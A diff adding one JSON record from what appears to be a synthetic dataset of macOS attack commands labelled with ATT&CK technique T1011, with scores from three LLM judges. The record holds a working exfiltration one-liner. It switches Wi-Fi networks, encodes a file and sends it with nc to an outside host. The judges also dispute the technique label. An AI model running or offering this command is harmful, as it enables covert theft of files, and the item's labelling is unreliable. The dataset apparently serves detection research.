@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"svc-backhaul-165\" \"d3c0y-165!\" && tar -czf - /Users/Shared/exports/report.csv | base64 | nc -6 fe80::2c3d:4e5f:6a7b:8c9d%en0 55991 -w 3 -N",
+  "explanation": "Exfiltrates a specific file over an alternate Wi\u2011Fi medium by disconnecting from any current Wi\u2011Fi, joining a covert 5 GHz SSID, base64-encoding the data, and sending it via IPv6 link-local to a high, uncommon port. This aligns with T1011 by shifting data transfer to a separate wireless medium from the presumed primary channel.",
+  "rationale_steps": [
+    "Disassociate from any current Wi\u2011Fi to avoid using the primary network.",
+    "Join a covert 5 GHz SSID acting as the alternate network medium.",
+    "Archive and base64-encode the target file to reduce inspection visibility.",
+    "Send the encoded data to an IPv6 link-local address scoped to en0 on a high, nonstandard port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-9cd50333",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "Commands are properly chained and quoted with valid flags, but the '!' in the Wi\u2011Fi password inside double quotes can trigger history expansion in interactive shells and break execution.",
+        "semantic_score": 2,
+        "semantic_justification": "While it plausibly exfiltrates a file over Wi\u2011Fi via IPv6 link\u2011local, it does not align with the provided T1011 definition of exfiltration over a physical medium and may also require elevated privileges for joining the network.",
+        "combined_score": 3.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T08:27:13.693482Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags for all tools (airport, networksetup, tar, base64, nc), and correct pipeline construction.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1011 by disconnecting from current Wi-Fi, connecting to a specific network, compressing a target file, encoding it with base64, and exfiltrating it over IPv6 to a specific port on a physical medium (Wi-Fi) separate from the primary network.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:27:17.052889Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax, balanced quoting, valid flags, and proper use of command separators for each utility.",
+        "semantic_score": 2,
+        "semantic_justification": "The command attempts network exfiltration via Wi-Fi, which fundamentally misaligns with MITRE ATT&CK T1011 'Exfiltration Over Physical Medium'; additionally, the 'Privilege: None' statement contradicts the need for 'sudo' for the 'airport' command and the likely need for 'sudo' for 'networksetup', reducing operational plausibility.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:27:42.190854Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 3.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
